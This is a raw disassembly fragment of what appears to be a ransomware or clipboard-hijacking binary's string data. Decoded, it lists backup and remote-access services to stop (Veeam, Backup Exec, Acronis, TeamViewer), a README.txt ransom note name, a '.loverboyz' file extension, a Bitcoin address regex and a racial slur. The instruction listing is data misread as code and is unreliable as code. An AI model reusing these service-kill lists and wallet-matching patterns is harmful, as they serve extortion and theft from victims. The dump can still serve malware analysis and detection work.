  40639f:	00 65 00             	add    %ah,0x0(%ebp)
  4063a2:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4063a6:	6d                   	insl   (%dx),%es:(%edi)
  4063a7:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  4063ab:	00 61 00             	add    %ah,0x0(%ecx)
  4063ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4063af:	00 73 00             	add    %dh,0x0(%ebx)
  4063b2:	70 00                	jo     0x4063b4
  4063b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4063b5:	00 72 00             	add    %dh,0x0(%edx)
  4063b8:	74 00                	je     0x4063ba
  4063ba:	53                   	push   %ebx
  4063bb:	00 76 00             	add    %dh,0x0(%esi)
  4063be:	63 00                	arpl   %eax,(%eax)
  4063c0:	00 2d 56 00 65 00    	add    %ch,0x650056
  4063c6:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4063ca:	6d                   	insl   (%dx),%es:(%edi)
  4063cb:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  4063cf:	00 70 00             	add    %dh,0x0(%eax)
  4063d2:	6c                   	insb   (%dx),%es:(%edi)
  4063d3:	00 6f 00             	add    %ch,0x0(%edi)
  4063d6:	79 00                	jns    0x4063d8
  4063d8:	6d                   	insl   (%dx),%es:(%edi)
  4063d9:	00 65 00             	add    %ah,0x0(%ebp)
  4063dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4063dd:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  4063e1:	00 65 00             	add    %ah,0x0(%ebp)
  4063e4:	72 00                	jb     0x4063e6
  4063e6:	76 00                	jbe    0x4063e8
  4063e8:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4063ee:	00 17                	add    %dl,(%edi)
  4063f0:	56                   	push   %esi
  4063f1:	00 65 00             	add    %ah,0x0(%ebp)
  4063f4:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4063f8:	6d                   	insl   (%dx),%es:(%edi)
  4063f9:	00 4e 00             	add    %cl,0x0(%esi)
  4063fc:	46                   	inc    %esi
  4063fd:	00 53 00             	add    %dl,0x0(%ebx)
  406400:	53                   	push   %ebx
  406401:	00 76 00             	add    %dh,0x0(%esi)
  406404:	63 00                	arpl   %eax,(%eax)
  406406:	00 19                	add    %bl,(%ecx)
  406408:	50                   	push   %eax
  406409:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40640d:	00 46 00             	add    %al,0x0(%esi)
  406410:	53                   	push   %ebx
  406411:	00 53 00             	add    %dl,0x0(%ebx)
  406414:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406418:	76 00                	jbe    0x40641a
  40641a:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  406420:	00 2b                	add    %ch,(%ebx)
  406422:	42                   	inc    %edx
  406423:	00 61 00             	add    %ah,0x0(%ecx)
  406426:	63 00                	arpl   %eax,(%eax)
  406428:	6b 00 75             	imul   $0x75,(%eax),%eax
  40642b:	00 70 00             	add    %dh,0x0(%eax)
  40642e:	45                   	inc    %ebp
  40642f:	00 78 00             	add    %bh,0x0(%eax)
  406432:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406436:	56                   	push   %esi
  406437:	00 53 00             	add    %dl,0x0(%ebx)
  40643a:	53                   	push   %ebx
  40643b:	00 50 00             	add    %dl,0x0(%eax)
  40643e:	72 00                	jb     0x406440
  406440:	6f                   	outsl  %ds:(%esi),(%dx)
  406441:	00 76 00             	add    %dh,0x0(%esi)
  406444:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  40644a:	72 00                	jb     0x40644c
  40644c:	00 35 42 00 61 00    	add    %dh,0x610042
  406452:	63 00                	arpl   %eax,(%eax)
  406454:	6b 00 75             	imul   $0x75,(%eax),%eax
  406457:	00 70 00             	add    %dh,0x0(%eax)
  40645a:	45                   	inc    %ebp
  40645b:	00 78 00             	add    %bh,0x0(%eax)
  40645e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406462:	41                   	inc    %ecx
  406463:	00 67 00             	add    %ah,0x0(%edi)
  406466:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40646a:	74 00                	je     0x40646c
  40646c:	41                   	inc    %ecx
  40646d:	00 63 00             	add    %ah,0x0(%ebx)
  406470:	63 00                	arpl   %eax,(%eax)
  406472:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  406477:	00 72 00             	add    %dh,0x0(%edx)
  40647a:	61                   	popa
  40647b:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40647f:	00 72 00             	add    %dh,0x0(%edx)
  406482:	00 29                	add    %ch,(%ecx)
  406484:	42                   	inc    %edx
  406485:	00 61 00             	add    %ah,0x0(%ecx)
  406488:	63 00                	arpl   %eax,(%eax)
  40648a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40648d:	00 70 00             	add    %dh,0x0(%eax)
  406490:	45                   	inc    %ebp
  406491:	00 78 00             	add    %bh,0x0(%eax)
  406494:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406498:	52                   	push   %edx
  406499:	00 50 00             	add    %dl,0x0(%eax)
  40649c:	43                   	inc    %ebx
  40649d:	00 53 00             	add    %dl,0x0(%ebx)
  4064a0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4064a4:	76 00                	jbe    0x4064a6
  4064a6:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4064ac:	00 15 41 00 63 00    	add    %dl,0x630041
  4064b2:	72 00                	jb     0x4064b4
  4064b4:	53                   	push   %ebx
  4064b5:	00 63 00             	add    %ah,0x0(%ebx)
  4064b8:	68 00 32 00 53       	push   $0x53003200
  4064bd:	00 76 00             	add    %dh,0x0(%esi)
  4064c0:	63 00                	arpl   %eax,(%eax)
  4064c2:	00 19                	add    %bl,(%ecx)
  4064c4:	41                   	inc    %ecx
  4064c5:	00 63 00             	add    %ah,0x0(%ebx)
  4064c8:	72 00                	jb     0x4064ca
  4064ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4064cb:	00 6e 00             	add    %ch,0x0(%esi)
  4064ce:	69 00 73 00 41 00    	imul   $0x410073,(%eax),%eax
  4064d4:	67 00 65 00          	add    %ah,0x0(%di)
  4064d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4064d9:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4064dd:	1b 43 00             	sbb    0x0(%ebx),%eax
  4064e0:	41                   	inc    %ecx
  4064e1:	00 53 00             	add    %dl,0x0(%ebx)
  4064e4:	41                   	inc    %ecx
  4064e5:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  4064e9:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  4064ed:	00 65 00             	add    %ah,0x0(%ebp)
  4064f0:	62 00                	bound  %eax,(%eax)
  4064f2:	53                   	push   %ebx
  4064f3:	00 76 00             	add    %dh,0x0(%esi)
  4064f6:	63 00                	arpl   %eax,(%eax)
  4064f8:	00 1d 43 00 41 00    	add    %bl,0x410043
  4064fe:	41                   	inc    %ecx
  4064ff:	00 52 00             	add    %dl,0x0(%edx)
  406502:	43                   	inc    %ebx
  406503:	00 55 00             	add    %dl,0x0(%ebp)
  406506:	70 00                	jo     0x406508
  406508:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40650c:	74 00                	je     0x40650e
  40650e:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  406512:	76 00                	jbe    0x406514
  406514:	63 00                	arpl   %eax,(%eax)
  406516:	00 15 54 00 65 00    	add    %dl,0x650054
  40651c:	61                   	popa
  40651d:	00 6d 00             	add    %ch,0x0(%ebp)
  406520:	56                   	push   %esi
  406521:	00 69 00             	add    %ch,0x0(%ecx)
  406524:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  406528:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40652c:	00 09                	add    %cl,(%ecx)
  40652e:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  406532:	70 00                	jo     0x406534
  406534:	67 00 00             	add    %al,(%bx,%si)
  406537:	13 43 00             	adc    0x0(%ebx),%eax
  40653a:	3a 00                	cmp    (%eax),%al
  40653c:	5c                   	pop    %esp
  40653d:	00 55 00             	add    %dl,0x0(%ebp)
  406540:	73 00                	jae    0x406542
  406542:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406546:	73 00                	jae    0x406548
  406548:	5c                   	pop    %esp
  406549:	00 00                	add    %al,(%eax)
  40654b:	27                   	daa
  40654c:	76 00                	jbe    0x40654e
  40654e:	34 00                	xor    $0x0,%al
  406550:	35 00 68 00 63       	xor    $0x63006800,%eax
  406555:	00 68 00             	add    %ch,0x0(%eax)
  406558:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40655c:	67 00 37             	add    %dh,(%bx)
  40655f:	00 32                	add    %dh,(%edx)
  406561:	00 6e 00             	add    %ch,0x0(%esi)
  406564:	73 00                	jae    0x406566
  406566:	37                   	aaa
  406567:	00 6d 00             	add    %ch,0x0(%ebp)
  40656a:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40656e:	6d                   	insl   (%dx),%es:(%edi)
  40656f:	00 79 00             	add    %bh,0x0(%ecx)
  406572:	00 19                	add    %bl,(%ecx)
  406574:	74 00                	je     0x406576
  406576:	69 00 77 00 6f 00    	imul   $0x6f0077,(%eax),%eax
  40657c:	72 00                	jb     0x40657e
  40657e:	6b 00 65             	imul   $0x65,(%eax),%eax
  406581:	00 72 00             	add    %dh,0x0(%edx)
  406584:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  406588:	78 00                	js     0x40658a
  40658a:	65 00 00             	add    %al,%gs:(%eax)
  40658d:	11 73 00             	adc    %esi,0x0(%ebx)
  406590:	6d                   	insl   (%dx),%es:(%edi)
  406591:	00 73 00             	add    %dh,0x0(%ebx)
  406594:	73 00                	jae    0x406596
  406596:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40659a:	78 00                	js     0x40659c
  40659c:	65 00 00             	add    %al,%gs:(%eax)
  40659f:	29 6f 00             	sub    %ebp,0x0(%edi)
  4065a2:	41                   	inc    %ecx
  4065a3:	00 6e 00             	add    %ch,0x0(%esi)
  4065a6:	57                   	push   %edi
  4065a7:	00 69 00             	add    %ch,0x0(%ecx)
  4065aa:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  4065ae:	7a 00                	jp     0x4065b0
  4065b0:	51                   	push   %ecx
  4065b1:	00 50 00             	add    %dl,0x0(%eax)
  4065b4:	73 00                	jae    0x4065b6
  4065b6:	52                   	push   %edx
  4065b7:	00 4b 00             	add    %cl,0x0(%ebx)
  4065ba:	37                   	aaa
  4065bb:	00 42 00             	add    %al,0x0(%edx)
  4065be:	6a 00                	push   $0x0
  4065c0:	38 00                	cmp    %al,(%eax)
  4065c2:	33 00                	xor    (%eax),%eax
  4065c4:	72 00                	jb     0x4065c6
  4065c6:	34 00                	xor    $0x0,%al
  4065c8:	00 19                	add    %bl,(%ecx)
  4065ca:	23 00                	and    (%eax),%eax
  4065cc:	62 00                	bound  %eax,(%eax)
  4065ce:	61                   	popa
  4065cf:	00 73 00             	add    %dh,0x0(%ebx)
  4065d2:	65 00 36             	add    %dh,%gs:(%esi)
  4065d5:	00 34 00             	add    %dh,(%eax,%eax,1)
  4065d8:	49                   	dec    %ecx
  4065d9:	00 6d 00             	add    %ch,0x0(%ebp)
  4065dc:	61                   	popa
  4065dd:	00 67 00             	add    %ah,0x0(%edi)
  4065e0:	65 00 00             	add    %al,%gs:(%eax)
  4065e3:	2b 31                	sub    (%ecx),%esi
  4065e5:	00 71 00             	add    %dh,0x0(%ecx)
  4065e8:	72 00                	jb     0x4065ea
  4065ea:	78 00                	js     0x4065ec
  4065ec:	30 00                	xor    %al,(%eax)
  4065ee:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4065f2:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  4065f6:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  4065fa:	72 00                	jb     0x4065fc
  4065fc:	30 00                	xor    %al,(%eax)
  4065fe:	6c                   	insb   (%dx),%es:(%edi)
  4065ff:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  406603:	00 63 00             	add    %ah,0x0(%ebx)
  406606:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40660a:	7a 00                	jp     0x40660c
  40660c:	6d                   	insl   (%dx),%es:(%edi)
  40660d:	00 00                	add    %al,(%eax)
  40660f:	15 52 00 45 00       	adc    $0x450052,%eax
  406614:	41                   	inc    %ecx
  406615:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  406619:	00 45 00             	add    %al,0x0(%ebp)
  40661c:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  406621:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406625:	1d 31 00 39 00       	sbb    $0x390031,%eax
  40662a:	44                   	inc    %esp
  40662b:	00 70 00             	add    %dh,0x0(%eax)
  40662e:	4a                   	dec    %edx
  40662f:	00 41 00             	add    %al,0x0(%ecx)
  406632:	57                   	push   %edi
  406633:	00 72 00             	add    %dh,0x0(%edx)
  406636:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40663a:	43                   	inc    %ebx
  40663b:	00 56 00             	add    %dl,0x0(%esi)
  40663e:	54                   	push   %esp
  40663f:	00 32                	add    %dh,(%edx)
  406641:	00 00                	add    %al,(%eax)
  406643:	05 62 00 63 00       	add    $0x630062,%eax
  406648:	00 73 28             	add    %dh,0x28(%ebx)
  40664b:	00 3f                	add    %bh,(%edi)
  40664d:	00 3a                	add    %bh,(%edx)
  40664f:	00 5b 00             	add    %bl,0x0(%ebx)
  406652:	31 00                	xor    %eax,(%eax)
  406654:	33 00                	xor    (%eax),%eax
  406656:	5d                   	pop    %ebp
  406657:	00 7b 00             	add    %bh,0x0(%ebx)
  40665a:	31 00                	xor    %eax,(%eax)
  40665c:	7d 00                	jge    0x40665e
  40665e:	5b                   	pop    %ebx
  40665f:	00 61 00             	add    %ah,0x0(%ecx)
  406662:	2d 00 6b 00 6d       	sub    $0x6d006b00,%eax
  406667:	00 2d 00 7a 00 41    	add    %ch,0x41007a00
  40666d:	00 2d 00 48 00 4a    	add    %ch,0x4a004800
  406673:	00 2d 00 4e 00 50    	add    %ch,0x50004e00
  406679:	00 2d 00 5a 00 31    	add    %ch,0x31005a00
  40667f:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  406685:	00 7b 00             	add    %bh,0x0(%ebx)
  406688:	32 00                	xor    (%eax),%al
  40668a:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40668e:	33 00                	xor    (%eax),%eax
  406690:	33 00                	xor    (%eax),%eax
  406692:	7d 00                	jge    0x406694
  406694:	7c 00                	jl     0x406696
  406696:	62 00                	bound  %eax,(%eax)
  406698:	63 00                	arpl   %eax,(%eax)
  40669a:	31 00                	xor    %eax,(%eax)
  40669c:	5b                   	pop    %ebx
  40669d:	00 61 00             	add    %ah,0x0(%ecx)
  4066a0:	2d 00 7a 00 30       	sub    $0x30007a00,%eax
  4066a5:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  4066ab:	00 7b 00             	add    %bh,0x0(%ebx)
  4066ae:	33 00                	xor    (%eax),%eax
  4066b0:	39 00                	cmp    %eax,(%eax)
  4066b2:	2c 00                	sub    $0x0,%al
  4066b4:	35 00 39 00 7d       	xor    $0x7d003900,%eax
  4066b9:	00 29                	add    %ch,(%ecx)
  4066bb:	00 01                	add    %al,(%ecx)
  4066bd:	25 6e 00 69 00       	and    $0x69006e,%eax
  4066c2:	67 00 67 00          	add    %ah,0x0(%bx)
  4066c6:	61                   	popa
  4066c7:	00 20                	add    %ah,(%eax)
  4066c9:	00 6e 00             	add    %ch,0x0(%esi)
  4066cc:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  4066d2:	61                   	popa
  4066d3:	00 61 00             	add    %ah,0x0(%ecx)
  4066d6:	20 00                	and    %al,(%eax)
  4066d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4066d9:	00 69 00             	add    %ch,0x0(%ecx)
  4066dc:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  4066e0:	61                   	popa
  4066e1:	00 00                	add    %al,(%eax)
  4066e3:	15 2e 00 6c 00       	adc    $0x6c002e,%eax
  4066e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4066e9:	00 76 00             	add    %dh,0x0(%esi)
  4066ec:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4066f0:	62 00                	bound  %eax,(%eax)
  4066f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4066f3:	00 79 00             	add    %bh,0x0(%ecx)
  4066f6:	7a 00                	jp     0x4066f8
  4066f8:	00 07                	add    %al,(%edi)
  4066fa:	62 00                	bound  %eax,(%eax)
  4066fc:	63 00                	arpl   %eax,(%eax)
  4066fe:	31 00                	xor    %eax,(%eax)
  406700:	00 00                	add    %al,(%eax)
  406702:	00 00                	add    %al,(%eax)
  406704:	b0 42                	mov    $0x42,%al
  406706:	32 cb                	xor    %bl,%cl
  406708:	57                   	push   %edi
  406709:	21 bd 42 a2 1b 86    	and    %edi,-0x79e45dbe(%ebp)
  40670f:	2f                   	das
  406710:	ed                   	in     (%dx),%eax
  406711:	1d ff 10 00 08       	sbb    $0x80010ff,%eax
  406716:	b7 7a                	mov    $0x7a,%bh
  406718:	5c                   	pop    %esp
  406719:	56                   	push   %esi
  40671a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40671d:	89 03                	mov    %eax,(%ebx)
  40671f:	06                   	push   %es
  406720:	1d 05 02 06 0e       	sbb    $0xe060205,%eax
  406725:	02 06                	add    (%esi),%al
  406727:	02 02                	add    (%edx),%al
  406729:	06                   	push   %es
  40672a:	08 03                	or     %al,(%ebx)
  40672c:	06                   	push   %es
  40672d:	12 0d 06 06 15 12    	adc    0x12150606,%cl
  406733:	11 01                	adc    %eax,(%ecx)
  406735:	0e                   	push   %cs
  406736:	03 06                	add    (%esi),%eax
  406738:	1d 0e 07 00 04       	sbb    $0x400070e,%eax
  40673d:	08 09                	or     %cl,(%ecx)
  40673f:	09 0e                	or     %ecx,(%esi)
  406741:	09 05 00 01 01 1d    	or     %eax,0x1d010100
  406747:	0e                   	push   %cs
  406748:	03 00                	add    (%eax),%eax
  40674a:	00 01                	add    %al,(%ecx)
  40674c:	03 00                	add    (%eax),%eax
  40674e:	00 02                	add    %al,(%edx)
  406750:	03 06                	add    (%esi),%eax
  406752:	12 15 04 00 01 0e    	adc    0xe010004,%dl
  406758:	08 04 00             	or     %al,(%eax,%eax,1)
  40675b:	01 0e                	add    %ecx,(%esi)
  40675d:	0e                   	push   %cs
  40675e:	04 00                	add    $0x0,%al
  406760:	01 01                	add    %eax,(%ecx)
  406762:	0e                   	push   %cs
  406763:	04 00                	add    $0x0,%al
  406765:	01 02                	add    %eax,(%edx)
  406767:	0e                   	push   %cs
  406768:	03 00                	add    (%eax),%eax
  40676a:	00 0e                	add    %cl,(%esi)
  40676c:	06                   	push   %es
  40676d:	00 03                	add    %al,(%ebx)
  40676f:	01 0e                	add    %ecx,(%esi)
  406771:	0e                   	push   %cs
  406772:	0e                   	push   %cs
  406773:	06                   	push   %es
  406774:	00 03                	add    %al,(%ebx)
  406776:	01 0e                	add    %ecx,(%esi)
  406778:	0e                   	push   %cs
  406779:	0a 04 00             	or     (%eax,%eax,1),%al
  40677c:	00 1d 05 05 00 02    	add    %bl,0x2000505
  406782:	0e                   	push   %cs
  406783:	0e                   	push   %cs
  406784:	0e                   	push   %cs
  406785:	03 20                	add    (%eax),%esp
  406787:	00 01                	add    %al,(%ecx)
  406789:	04 1d                	add    $0x1d,%al
  40678b:	03 00                	add    (%eax),%eax
  40678d:	00 04 00             	add    %al,(%eax,%eax,1)
  406790:	01 02                	add    %eax,(%edx)
  406792:	18 05 00 02 18 18    	sbb    %al,0x18180200
  406798:	18 02                	sbb    %al,(%edx)
  40679a:	06                   	push   %es
  40679b:	18 05 20 01 02 12    	sbb    %al,0x12020120
  4067a1:	0d 06 20 01 01       	or     $0x1012006,%eax
  4067a6:	10 11                	adc    %dl,(%ecx)
  4067a8:	19 04 20             	sbb    %eax,(%eax,%eiz,1)
  4067ab:	00 12                	add    %dl,(%edx)
  4067ad:	1d 04 28 00 12       	sbb    $0x12002804,%eax
  4067b2:	1d 05 20 01 01       	sbb    $0x1012005,%eax
  4067b7:	11 25 01 02 04 20    	adc    %esp,0x20040201
  4067bd:	01 01                	add    %eax,(%ecx)
  4067bf:	08 04 20             	or     %al,(%eax,%eiz,1)
  4067c2:	01 01                	add    %eax,(%ecx)
  4067c4:	0e                   	push   %cs
  4067c5:	03 06                	add    (%esi),%eax
  4067c7:	12 35 04 01 00 00    	adc    0x104,%dh
  4067cd:	00 05 00 01 11 41    	add    %al,0x41110100
  4067d3:	0e                   	push   %cs
  4067d4:	05 20 02 01 1c       	add    $0x1c010220,%eax
  4067d9:	18 05 20 01 01 12    	sbb    %al,0x12010120
  4067df:	35 04 00 01 01       	xor    $0x1010004,%eax
  4067e4:	08 05 00 01 01 12    	or     %al,0x12010100
  4067ea:	09 04 00             	or     %eax,(%eax,%eax,1)
  4067ed:	00 12                	add    %dl,(%edx)
  4067ef:	55                   	push   %ebp
  4067f0:	04 20                	add    $0x20,%al
  4067f2:	00 12                	add    %dl,(%edx)
  4067f4:	59                   	pop    %ecx
  4067f5:	03 20                	add    (%eax),%esp
  4067f7:	00 0e                	add    %cl,(%esi)
  4067f9:	05 00 02 02 0e       	add    $0xe020200,%eax
  4067fe:	0e                   	push   %cs
  4067ff:	0c 07                	or     $0x7,%al
  406801:	07                   	pop    %es
  406802:	1d 0e 0e 0e 02       	sbb    $0x20e0e0e,%eax
  406807:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  40680c:	04 00                	add    $0x0,%al
  40680e:	00 12                	add    %dl,(%edx)
  406810:	5d                   	pop    %ebp
  406811:	05 00 01 0e 11       	add    $0x110e0100,%eax
  406816:	65 04 07             	gs add $0x7,%al
  406819:	02 0e                	add    (%esi),%cl
  40681b:	0e                   	push   %cs
  40681c:	03 06                	add    (%esi),%eax
  40681e:	12 6d 05             	adc    0x5(%ebp),%ch
  406821:	20 01                	and    %al,(%ecx)
  406823:	12 6d 0e             	adc    0xe(%ebp),%ch
  406826:	04 20                	add    $0x20,%al
  406828:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40682b:	03 20                	add    (%eax),%esp
  40682d:	00 08                	add    %cl,(%eax)
  40682f:	06                   	push   %es
  406830:	07                   	pop    %es
  406831:	03 12                	add    (%edx),%edx
  406833:	6d                   	insl   (%dx),%es:(%edi)
  406834:	1c 02                	sbb    $0x2,%al
  406836:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40683b:	75 04                	jne    0x406841
  40683d:	00 00                	add    %al,(%eax)
  40683f:	12 75 04             	adc    0x4(%ebp),%dh
  406842:	20 00                	and    %al,(%eax)
  406844:	12 79 05             	adc    0x5(%ecx),%bh
  406847:	20 01                	and    %al,(%ecx)
  406849:	12 7d 08             	adc    0x8(%ebp),%bh
  40684c:	0e                   	push   %cs
  40684d:	07                   	pop    %es
  40684e:	06                   	push   %es
  40684f:	1d 12 75 12 75       	sbb    $0x75127512,%eax
  406854:	12 75 02             	adc    0x2(%ebp),%dh
  406857:	1d 12 75 08 05       	sbb    $0x5087512,%eax
  40685c:	20 02                	and    %al,(%edx)
  40685e:	08 08                	or     %cl,(%eax)
  406860:	08 04 20             	or     %al,(%eax,%eiz,1)
  406863:	01 03                	add    %eax,(%ebx)
  406865:	08 06                	or     %al,(%esi)
  406867:	20 01                	and    %al,(%ecx)
  406869:	12 80 85 03 07 07    	adc    0x7070385(%eax),%al
  40686f:	03 12                	add    (%edx),%edx
  406871:	80 85 08 03 05 00 00 	addb   $0x0,0x50308(%ebp)
  406878:	12 80 89 05 20 01    	adc    0x1200589(%eax),%al
  40687e:	1d 05 0e 05 00       	sbb    $0x50e05,%eax
  406883:	01 0e                	add    %ecx,(%esi)
  406885:	1d 05 04 07 01       	sbb    $0x1070405,%eax
  40688a:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  40688f:	18 03                	sbb    %al,(%ebx)
  406891:	06                   	push   %es
  406892:	12 1c 04             	adc    (%esp,%eax,1),%bl
  406895:	20 01                	and    %al,(%ecx)
  406897:	02 0e                	add    (%esi),%cl
  406899:	06                   	push   %es
  40689a:	15 12 80 91 01       	adc    $0x1918012,%eax
  40689f:	0e                   	push   %cs
  4068a0:	0e                   	push   %cs
  4068a1:	10 01                	adc    %al,(%ecx)
  4068a3:	02 02                	add    (%edx),%al
  4068a5:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
  4068aa:	80 91 01 1e 00 03 0a 	adcb   $0xa,0x3001e01(%ecx)
  4068b1:	01 0e                	add    %ecx,(%esi)
  4068b3:	06                   	push   %es
  4068b4:	20 01                	and    %al,(%ecx)
  4068b6:	01 11                	add    %edx,(%ecx)
  4068b8:	80 a1 03 20 00 0a 06 	andb   $0x6,0xa002003(%ecx)
  4068bf:	00 03                	add    %al,(%ebx)
  4068c1:	0e                   	push   %cs
  4068c2:	0e                   	push   %cs
  4068c3:	0e                   	push   %cs
  4068c4:	0e                   	push   %cs
  4068c5:	0a 00                	or     (%eax),%al
  4068c7:	02 01                	add    (%ecx),%al
  4068c9:	0e                   	push   %cs
  4068ca:	15 12 80 a9 01       	adc    $0x1a98012,%eax
  4068cf:	0e                   	push   %cs
  4068d0:	0c 07                	or     $0x7,%al
  4068d2:	07                   	pop    %es
  4068d3:	0e                   	push   %cs
  4068d4:	12 80 99 0e 0e 0e    	adc    0xe0e0e99(%eax),%al
  4068da:	0e                   	push   %cs
  4068db:	12 20                	adc    (%eax),%ah
  4068dd:	05 20 00 11 80       	add    $0x80110020,%eax
  4068e2:	a1 05 07 01 12       	mov    0x12010705,%eax
  4068e7:	80 ad 05 00 01 1d 0e 	subb   $0xe,0x1d010005(%ebp)
  4068ee:	0e                   	push   %cs
  4068ef:	06                   	push   %es
  4068f0:	15 12 80 b5 01       	adc    $0x1b58012,%eax
  4068f5:	08 0d 00 03 11 80    	or     %cl,0x80110300
  4068fb:	bd 08 08 15 12       	mov    $0x12150808,%ebp
  406900:	80 b5 01 08 06 07 02 	xorb   $0x2,0x7060801(%ebp)
  406907:	12 1c 12             	adc    (%edx,%edx,1),%bl
  40690a:	18 0b                	sbb    %cl,(%ebx)
  40690c:	07                   	pop    %es
  40690d:	06                   	push   %es
  40690e:	1d 0e 0e 02 1d       	sbb    $0x1d020e0e,%eax
  406913:	0e                   	push   %cs
  406914:	1d 0e 08 06 20       	sbb    $0x2006080e,%eax
  406919:	01 12                	add    %edx,(%edx)
  40691b:	80 85 0e 05 07 01 12 	addb   $0x12,0x107050e(%ebp)
  406922:	80 85 04 20 01 08 08 	addb   $0x8,0x8012004(%ebp)
  406929:	07                   	pop    %es
  40692a:	07                   	pop    %es
  40692b:	02 12                	add    (%edx),%dl
  40692d:	80 85 12 15 02 06 0a 	addb   $0xa,0x6021512(%ebp)
  406934:	09 00                	or     %eax,(%eax)
  406936:	02 01                	add    (%ecx),%al
  406938:	12 80 95 11 80 c9    	adc    -0x367fee6b(%eax),%al
  40693e:	07                   	pop    %es
  40693f:	20 02                	and    %al,(%edx)
  406941:	01 0e                	add    %ecx,(%esi)
  406943:	11 80 d1 06 20 01    	adc    %eax,0x12006d1(%eax)
  406949:	01 11                	add    %edx,(%ecx)
  40694b:	80 dd 08             	sbb    $0x8,%ch
  40694e:	20 03                	and    %al,(%ebx)
  406950:	01 1d 05 1d 05 08    	add    %ebx,0x8051d05
  406956:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40695b:	08 05 20 01 01 1d    	or     %al,0x1d010120
  406961:	05 06 20 01 01       	add    $0x1012006,%eax
  406966:	11 80 e9 07 20 03    	adc    %eax,0x32007e9(%eax)
  40696c:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  406972:	20 00                	and    %al,(%eax)
  406974:	12 80 f1 0c 20 03    	adc    0x3200cf1(%eax),%al
  40697a:	01 12                	add    %edx,(%edx)
  40697c:	80 ed 12             	sub    $0x12,%ch
  40697f:	80 f1 11             	xor    $0x11,%cl
  406982:	80 f9 06             	cmp    $0x6,%cl
  406985:	20 01                	and    %al,(%ecx)
  406987:	01 12                	add    %edx,(%edx)
  406989:	80 ed 0a             	sub    $0xa,%ch
  40698c:	20 03                	and    %al,(%ebx)
  40698e:	01 0e                	add    %ecx,(%esi)
  406990:	11 80 d1 11 80 fd    	adc    %eax,-0x27fee2f(%eax)
  406996:	05 00 02 01 0e       	add    $0xe010200,%eax
  40699b:	0e                   	push   %cs
  40699c:	1c 07                	sbb    $0x7,%al
  40699e:	0a 0e                	or     (%esi),%cl
  4069a0:	1d 05 12 80 cd       	sbb    $0xcd801205,%eax
  4069a5:	1d 05 12 80 d5       	sbb    $0xd5801205,%eax
  4069aa:	12 80 e1 12 80 f5    	adc    -0xa7fed1f(%eax),%al
  4069b0:	12 80 cd 12 80 cd    	adc    -0x327fed33(%eax),%al
  4069b6:	12 81 01 0d 20 04    	adc    0x4200d01(%ecx),%al
  4069bc:	01 0e                	add    %ecx,(%esi)
  4069be:	11 80 d1 11 80 fd    	adc    %eax,-0x27fee2f(%eax)
  4069c4:	11 81 09 04 20 01    	adc    %eax,0x1200409(%ecx)
  4069ca:	01 0a                	add    %ecx,(%edx)
  4069cc:	05 07 01 12 80       	add    $0x80120107,%eax
  4069d1:	cd 08                	int    $0x8
